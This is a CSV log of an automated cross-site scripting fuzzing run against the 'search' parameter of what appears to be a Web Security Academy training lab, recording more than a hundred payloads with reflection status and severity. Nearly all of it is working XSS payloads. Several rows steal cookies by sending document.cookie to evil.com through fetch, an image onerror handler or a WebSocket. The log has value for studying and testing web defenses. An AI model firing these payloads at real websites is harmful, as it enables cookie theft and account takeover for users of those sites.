Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:01:13.814,2026-01-10 16:01:14.110,0.296,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div id=x tabindex=1 onactivate=alert(1)></div>,RAW_REFLECTION,No,,High
2026-01-10 16:01:14.110,2026-01-10 16:01:14.431,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div contenteditable onblur=alert(1)>test</div>,RAW_REFLECTION,No,,High
2026-01-10 16:01:14.431,2026-01-10 16:01:14.618,0.187,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div draggable=true ondrag=alert(1)>test</div>,RAW_REFLECTION,No,,High
2026-01-10 16:01:14.618,2026-01-10 16:01:14.911,0.293,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg><animate onbegin=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:14.911,2026-01-10 16:01:15.231,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg><set onbegin=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:15.231,2026-01-10 16:01:15.551,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg><animatemotion onbegin=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:15.551,2026-01-10 16:01:15.871,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg><animatetransform onbegin=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:15.871,2026-01-10 16:01:16.086,0.216,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg><discard onbegin=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:16.087,2026-01-10 16:01:16.350,0.264,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,RAW_REFLECTION,No,,High
2026-01-10 16:01:16.351,2026-01-10 16:01:16.543,0.193,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",RAW_REFLECTION,No,,High
2026-01-10 16:01:16.543,2026-01-10 16:01:16.830,0.286,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",RAW_REFLECTION,No,,High
2026-01-10 16:01:16.830,2026-01-10 16:01:17.149,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",RAW_REFLECTION,No,,High
2026-01-10 16:01:17.149,2026-01-10 16:01:17.360,0.211,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img name=alert src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:17.360,2026-01-10 16:01:17.559,0.199,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<form name=alert><input type=submit onclick=alert(1)></form>,RAW_REFLECTION,No,,High
2026-01-10 16:01:17.559,2026-01-10 16:01:17.789,0.231,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>alert(document.cookie)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:17.789,2026-01-10 16:01:18.110,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>fetch('http://evil.com?c='+document.cookie)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:18.110,2026-01-10 16:01:18.329,0.218,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,RAW_REFLECTION,No,,High
2026-01-10 16:01:18.329,2026-01-10 16:01:18.589,0.260,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg onload=fetch('http://evil.com?c='+document.cookie)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:18.589,2026-01-10 16:01:18.794,0.204,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>document.body.innerHTML+=alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:18.794,2026-01-10 16:01:18.988,0.194,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:18.988,2026-01-10 16:01:19.229,0.241,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<body/onhashchange=alert(1)><a href=#x>clickme</a>,RAW_REFLECTION,No,,High
2026-01-10 16:01:19.229,2026-01-10 16:01:19.549,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<body/onpopstate=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:19.549,2026-01-10 16:01:19.777,0.228,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<body/onpageshow=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:19.777,2026-01-10 16:01:19.997,0.220,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<body/onpagehide=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:19.997,2026-01-10 16:01:20.189,0.192,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<body/onstorage=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:20.189,2026-01-10 16:01:20.361,0.171,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:20.361,2026-01-10 16:01:20.541,0.181,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script><![CDATA[alert(1)]]></script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:20.541,2026-01-10 16:01:20.734,0.192,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<?xml version=""1.0""?><script>alert(1)</script>",RAW_REFLECTION,No,,High
2026-01-10 16:01:20.734,2026-01-10 16:01:20.989,0.255,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",RAW_REFLECTION,No,,High
2026-01-10 16:01:20.989,2026-01-10 16:01:21.314,0.325,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,﻿<script>alert(1)</script>,NO_REFLECTION,No,,Info
2026-01-10 16:01:21.314,2026-01-10 16:01:21.517,0.203,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<source src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:21.517,2026-01-10 16:01:21.717,0.200,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<track src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:21.717,2026-01-10 16:01:21.948,0.231,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<image src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:21.949,2026-01-10 16:01:22.167,0.218,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<use href=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:22.167,2026-01-10 16:01:22.377,0.210,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input autofocus onfocus=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:22.377,2026-01-10 16:01:22.593,0.216,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,No,,High
2026-01-10 16:01:22.593,2026-01-10 16:01:22.910,0.317,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,No,,High
2026-01-10 16:01:22.910,2026-01-10 16:01:23.230,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<button autofocus onfocus=alert(1)>X</button>,RAW_REFLECTION,No,,High
2026-01-10 16:01:23.230,2026-01-10 16:01:23.503,0.273,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div onpointerdown=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 16:01:23.503,2026-01-10 16:01:23.733,0.230,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div onpointerup=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 16:01:23.733,2026-01-10 16:01:23.963,0.230,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div onpointerover=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 16:01:23.963,2026-01-10 16:01:24.188,0.225,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div onpointerenter=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 16:01:24.188,2026-01-10 16:01:24.509,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div onpointerleave=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 16:01:24.509,2026-01-10 16:01:24.829,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div onpointermove=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 16:01:24.829,2026-01-10 16:01:25.148,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div ontouchstart=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 16:01:25.148,2026-01-10 16:01:25.469,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div ontouchend=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 16:01:25.469,2026-01-10 16:01:25.696,0.227,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div ontouchmove=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 16:01:25.696,2026-01-10 16:01:25.902,0.206,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",RAW_REFLECTION,No,,High
2026-01-10 16:01:25.902,2026-01-10 16:01:26.112,0.210,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",RAW_REFLECTION,No,,High
2026-01-10 16:01:26.112,2026-01-10 16:01:26.325,0.212,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",RAW_REFLECTION,No,,High
2026-01-10 16:01:26.325,2026-01-10 16:01:26.574,0.250,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",RAW_REFLECTION,No,,High
2026-01-10 16:01:26.574,2026-01-10 16:01:26.802,0.228,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div data-x=x onclick=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 16:01:26.802,2026-01-10 16:01:27.068,0.265,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input accesskey=x onclick=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:27.068,2026-01-10 16:01:27.389,0.322,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<div contenteditable oninput=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 16:01:27.389,2026-01-10 16:01:27.709,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<input type=hidden onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:01:27.709,2026-01-10 16:01:28.030,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<select><option oninput=alert(1)>X</option></select>,RAW_REFLECTION,No,,High
2026-01-10 16:01:28.030,2026-01-10 16:01:28.348,0.318,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<img/src=""x""/onerror=alert(1)>",RAW_REFLECTION,No,,High
2026-01-10 16:01:28.348,2026-01-10 16:01:28.673,0.325,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img%20src=x%20onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:28.673,2026-01-10 16:01:28.988,0.315,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:28.988,2026-01-10 16:01:29.312,0.324,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script	>alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:29.312,2026-01-10 16:01:29.554,0.243,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script,ESCAPED,No,,Low
2026-01-10 16:01:29.554,2026-01-10 16:01:29.787,0.233,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,>alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:29.787,2026-01-10 16:01:30.109,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<script,ESCAPED,No,,Low
2026-01-10 16:01:30.109,2026-01-10 16:01:30.428,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,src=//evil.com></script>,RAW_REFLECTION,No,,High
2026-01-10 16:01:30.428,2026-01-10 16:01:30.656,0.228,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg/onload=prompt(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:30.657,2026-01-10 16:01:30.907,0.251,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg/onload=confirm(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:30.907,2026-01-10 16:01:31.241,0.333,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<svg/onload=print()>,RAW_REFLECTION,No,,High
2026-01-10 16:01:31.241,2026-01-10 16:01:31.547,0.307,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<marquee onstart=prompt(1)>X</marquee>,RAW_REFLECTION,No,,High
2026-01-10 16:01:31.547,2026-01-10 16:01:31.868,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<marquee onstart=confirm(1)>X</marquee>,RAW_REFLECTION,No,,High
2026-01-10 16:01:31.868,2026-01-10 16:01:32.188,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<iframe/src=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:32.188,2026-01-10 16:01:32.509,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<iframe/onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:32.509,2026-01-10 16:01:32.828,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<iframe%20src=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:32.828,2026-01-10 16:01:33.039,0.211,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<object/data=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:33.039,2026-01-10 16:01:33.260,0.221,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",RAW_REFLECTION,No,,High
2026-01-10 16:01:33.260,2026-01-10 16:01:33.506,0.247,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<embed/src=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:33.506,2026-01-10 16:01:33.788,0.282,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,"<embed src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,No,,High
2026-01-10 16:01:33.788,2026-01-10 16:01:34.108,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<var onmouseover=alert(1)>X</var>,RAW_REFLECTION,No,,High
2026-01-10 16:01:34.108,2026-01-10 16:01:34.427,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<code onmouseover=alert(1)>X</code>,RAW_REFLECTION,No,,High
2026-01-10 16:01:34.427,2026-01-10 16:01:34.747,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<span onmouseover=alert(1)>X</span>,RAW_REFLECTION,No,,High
2026-01-10 16:01:34.747,2026-01-10 16:01:35.075,0.329,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<p onmouseover=alert(1)>X</p>,RAW_REFLECTION,No,,High
2026-01-10 16:01:35.075,2026-01-10 16:01:35.295,0.220,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<h1 onmouseover=alert(1)>X</h1>,RAW_REFLECTION,No,,High
2026-01-10 16:01:35.295,2026-01-10 16:01:35.548,0.252,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<h2 onmouseover=alert(1)>X</h2>,RAW_REFLECTION,No,,High
2026-01-10 16:01:35.548,2026-01-10 16:01:35.868,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<pre onmouseover=alert(1)>X</pre>,RAW_REFLECTION,No,,High
2026-01-10 16:01:35.868,2026-01-10 16:01:36.191,0.323,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<blockquote onmouseover=alert(1)>X</blockquote>,RAW_REFLECTION,No,,High
2026-01-10 16:01:36.191,2026-01-10 16:01:36.507,0.316,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<ol onmouseover=alert(1)><li>X</li></ol>,RAW_REFLECTION,No,,High
2026-01-10 16:01:36.507,2026-01-10 16:01:36.720,0.213,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<ul onmouseover=alert(1)><li>X</li></ul>,RAW_REFLECTION,No,,High
2026-01-10 16:01:36.720,2026-01-10 16:01:36.992,0.272,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<li onmouseover=alert(1)>X</li>,RAW_REFLECTION,No,,High
2026-01-10 16:01:36.992,2026-01-10 16:01:37.310,0.318,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<dl onmouseover=alert(1)><dt>X</dt></dl>,RAW_REFLECTION,No,,High
2026-01-10 16:01:37.310,2026-01-10 16:01:37.579,0.268,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<dt onmouseover=alert(1)>X</dt>,RAW_REFLECTION,No,,High
2026-01-10 16:01:37.579,2026-01-10 16:01:37.791,0.212,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<dd onmouseover=alert(1)>X</dd>,RAW_REFLECTION,No,,High
2026-01-10 16:01:37.791,2026-01-10 16:01:38.107,0.317,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<fieldset onmouseover=alert(1)>X</fieldset>,RAW_REFLECTION,No,,High
2026-01-10 16:01:38.107,2026-01-10 16:01:38.300,0.193,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<legend onmouseover=alert(1)>X</legend>,RAW_REFLECTION,No,,High
2026-01-10 16:01:38.300,2026-01-10 16:01:38.505,0.205,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<label onmouseover=alert(1)>X</label>,RAW_REFLECTION,No,,High
2026-01-10 16:01:38.505,2026-01-10 16:01:38.747,0.243,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<table><caption onmouseover=alert(1)>X</caption></table>,RAW_REFLECTION,No,,High
2026-01-10 16:01:38.747,2026-01-10 16:01:38.943,0.196,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<table><colgroup onmouseover=alert(1)></colgroup></table>,RAW_REFLECTION,No,,High
2026-01-10 16:01:38.943,2026-01-10 16:01:39.139,0.195,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<table><col onmouseover=alert(1)></table>,RAW_REFLECTION,No,,High
2026-01-10 16:01:39.139,2026-01-10 16:01:39.386,0.247,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<table><thead onmouseover=alert(1)></thead></table>,RAW_REFLECTION,No,,High
2026-01-10 16:01:39.386,2026-01-10 16:01:39.707,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<table><tbody onmouseover=alert(1)></tbody></table>,RAW_REFLECTION,No,,High
2026-01-10 16:01:39.707,2026-01-10 16:01:40.027,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<table><tfoot onmouseover=alert(1)></tfoot></table>,RAW_REFLECTION,No,,High
2026-01-10 16:01:40.027,2026-01-10 16:01:40.347,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<table><tr onmouseover=alert(1)></tr></table>,RAW_REFLECTION,No,,High
2026-01-10 16:01:40.347,2026-01-10 16:01:40.665,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<table><th onmouseover=alert(1)>X</th></table>,RAW_REFLECTION,No,,High
2026-01-10 16:01:40.665,2026-01-10 16:01:40.987,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<table><td onmouseover=alert(1)>X</td></table>,RAW_REFLECTION,No,,High
2026-01-10 16:01:40.987,2026-01-10 16:01:41.307,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<meter onmouseover=alert(1)>X</meter>,RAW_REFLECTION,No,,High
2026-01-10 16:01:41.307,2026-01-10 16:01:41.627,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<progress onmouseover=alert(1)>X</progress>,RAW_REFLECTION,No,,High
2026-01-10 16:01:41.627,2026-01-10 16:01:41.804,0.178,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<output onmouseover=alert(1)>X</output>,RAW_REFLECTION,No,,High
2026-01-10 16:01:41.804,2026-01-10 16:01:41.986,0.182,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<time onmouseover=alert(1)>X</time>,RAW_REFLECTION,No,,High
2026-01-10 16:01:41.986,2026-01-10 16:01:42.267,0.281,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<mark onmouseover=alert(1)>X</mark>,RAW_REFLECTION,No,,High
2026-01-10 16:01:42.267,2026-01-10 16:01:42.586,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<ruby onmouseover=alert(1)>X</ruby>,RAW_REFLECTION,No,,High
2026-01-10 16:01:42.586,2026-01-10 16:01:42.906,0.320,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,RAW_REFLECTION,No,,High
2026-01-10 16:01:42.906,2026-01-10 16:01:43.089,0.183,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,RAW_REFLECTION,No,,High
2026-01-10 16:01:43.089,2026-01-10 16:01:43.386,0.297,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<bdi onmouseover=alert(1)>X</bdi>,RAW_REFLECTION,No,,High
2026-01-10 16:01:43.386,2026-01-10 16:01:43.705,0.319,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<bdo onmouseover=alert(1)>X</bdo>,RAW_REFLECTION,No,,High
2026-01-10 16:01:43.705,2026-01-10 16:01:44.026,0.321,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<wbr onmouseover=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:01:44.026,2026-01-10 16:01:44.214,0.188,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<ins onmouseover=alert(1)>X</ins>,RAW_REFLECTION,No,,High
2026-01-10 16:01:44.214,2026-01-10 16:01:44.412,0.198,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<del onmouseover=alert(1)>X</del>,RAW_REFLECTION,No,,High
2026-01-10 16:01:44.412,2026-01-10 16:01:44.670,0.257,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<small onmouseover=alert(1)>X</small>,RAW_REFLECTION,No,,High
2026-01-10 16:01:44.670,2026-01-10 16:01:44.903,0.233,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<strong onmouseover=alert(1)>X</strong>,RAW_REFLECTION,No,,High
2026-01-10 16:01:44.903,2026-01-10 16:01:45.109,0.205,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<em onmouseover=alert(1)>X</em>,RAW_REFLECTION,No,,High
2026-01-10 16:01:45.109,2026-01-10 16:01:45.314,0.205,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<b onmouseover=alert(1)>X</b>,RAW_REFLECTION,No,,High
2026-01-10 16:01:45.314,2026-01-10 16:01:45.630,0.316,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<i onmouseover=alert(1)>X</i>,RAW_REFLECTION,No,,High
2026-01-10 16:01:45.630,2026-01-10 16:01:45.945,0.315,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<u onmouseover=alert(1)>X</u>,RAW_REFLECTION,No,,High
2026-01-10 16:01:45.945,2026-01-10 16:01:46.147,0.202,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<s onmouseover=alert(1)>X</s>,RAW_REFLECTION,No,,High
2026-01-10 16:01:46.147,2026-01-10 16:01:46.426,0.279,https://0ac500bd04ca0ab5821c659f00dd00c8.web-security-academy.net/,GET,search,<sub onmouseover=alert(1)>X</sub>,RAW_REFLECTION,No,,High
